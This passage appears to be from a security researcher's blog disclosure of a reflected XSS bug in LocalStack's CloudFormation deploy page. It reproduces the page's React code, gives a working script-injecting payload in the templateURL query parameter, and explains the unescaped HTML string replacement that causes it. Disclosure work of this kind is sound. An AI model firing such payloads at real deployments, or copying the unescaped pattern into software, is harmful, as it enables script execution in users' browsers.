+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">templateBodyStr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">templateBody</span>, <span style="color:#66d9ef">undefined</span>, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">templateBody</span>.<span style="color:#a6e22e">Parameters</span> <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">paramsMapped</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">params</span>).<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">p</span> =&gt; ({<span style="color:#a6e22e">ParameterKey</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>, <span style="color:#a6e22e">ParameterValue</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">p</span>].<span style="color:#a6e22e">Default</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;&#34;</span>, ... <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">p</span>]}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">region</span>, <span style="color:#a6e22e">setRegion</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">useState</span>(<span style="color:#a6e22e">passedRegion</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">stackName</span>, <span style="color:#a6e22e">setStackName</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">useState</span>(<span style="color:#a6e22e">defaultStackName</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">parameters</span>, <span style="color:#a6e22e">setParameters</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">useState</span>(<span style="color:#a6e22e">paramsMapped</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">errorMessage</span>, <span style="color:#a6e22e">setErrorMessage</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">useState</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handle</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">handler</span>) =&gt; (<span style="color:#a6e22e">event</span>) =&gt; <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handleParam</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">paramKey</span>) =&gt; (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">parameters</span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">ParameterKey</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">paramKey</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">ParameterValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">value</span>; <span style="color:#a6e22e">setParameters</span>([...<span style="color:#a6e22e">parameters</span>])
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">deployStack</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">setErrorMessage</span>(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">AWS</span>.<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">update</span>({<span style="color:#a6e22e">region</span>});
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AWS</span>.<span style="color:#a6e22e">CloudFormation</span>();
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stackParameters</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">StackName</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">stackName</span>, <span style="color:#a6e22e">TemplateBody</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">templateBodyStr</span>, <span style="color:#a6e22e">Parameters</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">stackParameters</span>};
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">createStack</span>(<span style="color:#a6e22e">params</span>).<span style="color:#a6e22e">promise</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">setResult</span>(<span style="color:#a6e22e">result</span>);
+</span></span><span style="display:flex;"><span>          } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setErrorMessage</span>(<span style="color:#e6db74">`Error deploying CloudFormation stack: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">e</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">table</span> <span style="color:#a6e22e">className</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pure-table&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">tbody</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">tr</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Template</span> <span style="color:#a6e22e">URL</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;&lt;td&gt;{templateURL}&lt;/td&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;&lt;tr&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Template</span> <span style="color:#a6e22e">Body</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;&lt;td&gt;</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">textarea</span> <span style="color:#a6e22e">rows</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span>{{<span style="color:#a6e22e">width</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;100%&#34;</span>}} <span style="color:#a6e22e">disabled</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">true</span>} <span style="color:#a6e22e">defaultValue</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">templateBodyStr</span>}<span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/textarea&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;&lt;tr&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Stack</span> <span style="color:#a6e22e">Name</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">/td&gt;&lt;td&gt;&lt;input name=&#34;stackName&#34; value={stackName} onChange={handle(setStackName)}/</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;&lt;tr&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Stack</span> <span style="color:#a6e22e">Parameters</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;&lt;td&gt;</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">table</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">tbody</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                  {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">parameters</span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">tr</span> <span style="color:#a6e22e">key</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">ParameterKey</span>}<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span>{<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">ParameterKey</span>} <span style="color:#f92672">=&lt;</span><span style="color:#e6db74">/td&gt;&lt;td&gt;&lt;input type=&#34;text&#34; value={p.ParameterValue} onChange={handleParam(p.ParameterKey)}/</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;)</span>
+</span></span><span style="display:flex;"><span>                  }
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tbody&gt;&lt;/table&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;&lt;tr&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Target</span> <span style="color:#a6e22e">Region</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;&lt;td&gt;</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">select</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;region&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">region</span>} <span style="color:#a6e22e">onChange</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">handle</span>(<span style="color:#a6e22e">setRegion</span>)}<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>                    {<span style="color:#a6e22e">REGIONS</span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">r</span>} <span style="color:#a6e22e">key</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">r</span>}<span style="color:#f92672">&gt;</span>{<span style="color:#a6e22e">r</span>}<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/option&gt;)}</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/select&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;&lt;tr&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">td</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/td&gt;&lt;td&gt;&lt;button onClick={deployStack}&gt;Deploy Stack Locally&lt;/button&gt;&lt;p&gt;{errorMessage}&lt;/p&gt;&lt;/td&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tr&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/tbody&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/table&gt;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">RequestHandler</span> (<span style="color:#a6e22e">props</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">initErrorMessage</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>Error<span style="color:#f92672">:</span> {<span style="color:#a6e22e">initErrorMessage</span>}<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/div&gt;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">templateURL</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">p</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">specify</span> <span style="color:#a6e22e">stack</span> <span style="color:#a6e22e">template</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">as</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">code</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">templateURL</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/code&gt; query parameter, or in the field below:</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/p&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;templateURL&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span>{{<span style="color:#a6e22e">width</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;500px&#34;</span>}} <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Continue</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/button&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/form&gt;</span>
+</span></span><span style="display:flex;"><span>          );
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">deployResult</span>, <span style="color:#a6e22e">setDeployResult</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">useState</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">deployResult</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#f92672">&lt;&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">p</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Stack</span> <span style="color:#a6e22e">deployment</span> <span style="color:#a6e22e">successfully</span> <span style="color:#a6e22e">started</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">please</span> <span style="color:#a6e22e">check</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">logs</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">LocalStack</span> <span style="color:#a6e22e">instance</span>. <span style="color:#a6e22e">Deployment</span> <span style="color:#a6e22e">response</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/p&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">pre</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span>{{<span style="color:#a6e22e">padding</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;5px&#34;</span>, <span style="color:#a6e22e">border</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1px solid #000&#34;</span>}}<span style="color:#f92672">&gt;</span>{<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">deployResult</span>, <span style="color:#66d9ef">null</span>, <span style="color:#ae81ff">4</span>)}<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/pre&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">p</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Note</span><span style="color:#f92672">:&lt;</span><span style="color:#960050;background-color:#1e0010">/b&gt; To interactively browse the state of the locally deployed resources, you may want to check out our Web UI at { }</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://app.localstack.cloud&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.localstack.cloud&lt;/a&gt; !
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/p&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/&gt;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">StackDetails</span> <span style="color:#a6e22e">setResult</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">setDeployResult</span>} <span style="color:#f92672">/&gt;</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">App</span> (<span style="color:#a6e22e">props</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">className</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrapper&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span>{{<span style="color:#66d9ef">float</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;left&#34;</span>, <span style="color:#a6e22e">width</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;60px&#34;</span>, <span style="color:#a6e22e">margin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;12px&#34;</span>}} <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://app.localstack.cloud/images/logos/localstack.png&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span>{{<span style="color:#66d9ef">float</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;left&#34;</span>}}<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">LocalStack</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/div&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h3</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span>{{<span style="color:#a6e22e">clear</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;both&#34;</span>}}<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Deploy</span> <span style="color:#a6e22e">CloudFormation</span> <span style="color:#a6e22e">Stack</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h3&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">RequestHandler</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/div&gt;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ReactDOM</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">App</span>), document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;root&#39;</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/body&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/html&gt;</span>
+</span></span></code></pre></div><p>Without a doubt a broken feature but seems interesting to look into:</p>
+<p><img src="/images/broken.png" alt="alt"></p>
+<p>this code from the page tells me that the URL is constructed as per documentation and looks like http://localhost:4566/_localstack/cloudformation/deploy?templateURL=</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">templateURL</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">queryParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;templateURL&#34;</span>);
+</span></span></code></pre></div><p>first attempt that worked immediately was the most silly one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost:4566/_localstack/cloudformation/deploy?templateURL<span style="color:#f92672">=</span>%3Cscript%3Ealert<span style="color:#f92672">(</span>%27XSS%20via%20templateBody%27<span style="color:#f92672">)</span>%3C/script%3E
+</span></span></code></pre></div><p>worked first shot! no code review no fancy stuff, so I got a reflected XSS</p>
+<p><img src="/images/xss.png" alt="alt"></p>
+<p>Indeed the injected javascript code was reflected in the page source code :)</p>
+<p><img src="/images/render.png" alt="alt"></p>
+<p>Time to look at the vulnerable code, which was silently removed by the vendor (after my 2 reports) <a href="https://github.com/localstack/localstack/pull/13293/">https://github.com/localstack/localstack/pull/13293/</a></p>
+<p><img src="/images/pr.png" alt="alt"></p>
+<p>Pr merged on 24th of October 2025, where as my first report to CEO and Senior management promptly happened on the 17th of October 2025</p>
+<p><img src="/images/report.png" alt="alt"></p>
+<h1 id="the-vulnerability">The Vulnerability</h1>
+<p>The core issue is on lines 44-45:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> params<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    deploy_html <span style="color:#f92672">=</span> deploy_html<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;&#34;</span>, value)
+</span></span></code></pre></div><p>This performs simple string replacement directly into HTML without any HTML escaping. The code inserts user-controlled
+data (from the templateURL parameter) into the HTML response.</p>
+<p>Attack Vector</p>
+<p>When you access the URL with a malicious templateURL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">templateURL</span><span style="color:#f92672">=&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;XSS&#39;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p>Here&rsquo;s what happens:</p>
+<ol>
+<li>Line 31: The malicious payload is extracted from <code>req_params.get(&quot;templateURL&quot;)</code></li>
+<li>Lines 33-41: The code attempts to download the &ldquo;URL&rdquo; (which is actually a script tag):
+- <code>requests.get(&quot;&lt;script&gt;alert('XSS')&lt;/script&gt;&quot;)</code> fails
+- The exception e on line 39 contains the malicious URL
+- The error message becomes: &ldquo;Unable to download CloudFormation template URL: [exception details including the
+malicious URL]&rdquo;
+- Line 41: <code>json.dumps()</code> encodes the message, but JSON encoding alone doesn&rsquo;t prevent XSS in HTML context</li>
+<li>Line 45: The JSON-encoded string (which still contains the script tags) is inserted directly into the HTML using
+string replacement</li>
+<li>The Browser: When the browser renders the HTML, if the value is placed in an unsafe context in the deploy.html
+template (like outside of a properly quoted attribute, or in a script context), the JavaScript executes.</li>
+</ol>
+<p>This is a reflected XSS vulnerability that could allow attackers to execute arbitrary JavaScript in users&rsquo; browsers when they click on a malicious link.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>  <span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>  <span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>  <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>  <span style="color:#f92672">import</span> requests
